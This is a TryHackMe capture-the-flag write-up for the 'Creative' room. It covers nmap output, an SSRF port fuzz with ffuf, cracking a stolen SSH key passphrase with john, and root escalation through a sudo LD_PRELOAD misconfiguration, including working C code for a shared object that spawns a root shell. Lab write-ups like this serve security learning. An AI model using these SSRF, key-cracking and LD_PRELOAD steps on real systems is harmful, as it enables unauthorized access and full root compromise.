---
title: THM Creative
author: hanhctf
date: 2024-05-21 12:00:00 +0700
categories: [Write-up, THM]
tags: [SSRF]
toc: true
mermaid: true
---

# [**Creative**](https://tryhackme.com/r/room/creative)

# Summary
>
> - 'beta' subdomain
> - SSRF --> LFI 
> - LPE with LD_Preload

## NMAP

```text
Nmap scan report for creative.thm (10.10.204.200)
Host is up (0.40s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

The Nmap scan reveals only two ports: port 22, on which we have SSH, and port 80, a web server with nginx 1.18.0.  
Nothing interesting on the web server.  
Time to enumerate some subdomains `creative.thm`.  
We find the subdomain `beta.creative.thm`.

![](/commons/THM/Creative/0_subdomain.png)  

Open `beta.creative.thm'  

![](/commons/THM/Creative/1_SSRF.png)

This site will test a url. **Command inject**, **SSRF**, **LFI** is first things in my mind.  

After try some simple payload. I found **SSRF**. Check port on `127.0.0.1`

```shell
ffuf -w /opt/SecLists/Fuzzing/5-digits-00000-99999.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3
```
![](/commons/THM/Creative/2_1337.png)

After enumaration, we got id_rsa file.
![](/commons/THM/Creative/3_id_rsa.png)

Login SSH with this key. It request a passphare. :))  
We will try to use ssh2john to crack passphare of ssh. (Almost in CTF, rockyou.txt is your friend)  

```shell
ssh2john id_rsa > id_rsa.hash
/opt/john/run/john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

***GOT USER.TXT FLAG***


## Privilege Escalation
Login as `saad`, we found creds in .bash_history.
![](/commons/THM/Creative/5_creds.png)

Check `sudo -l`
![](/commons/THM/Creative/6_ping.png)

`/usr/bin/ping` can run as `root` but no command useful.  
`env_keep+=LD_PRELOAD` we found an artic writes about [LPE using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) 

1.Create a `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

Compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type following:

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so sudo /usr/bin/ping
```

![](/commons/THM/Creative/7_root.png)

***GOT ROOT.TXT FLAG***
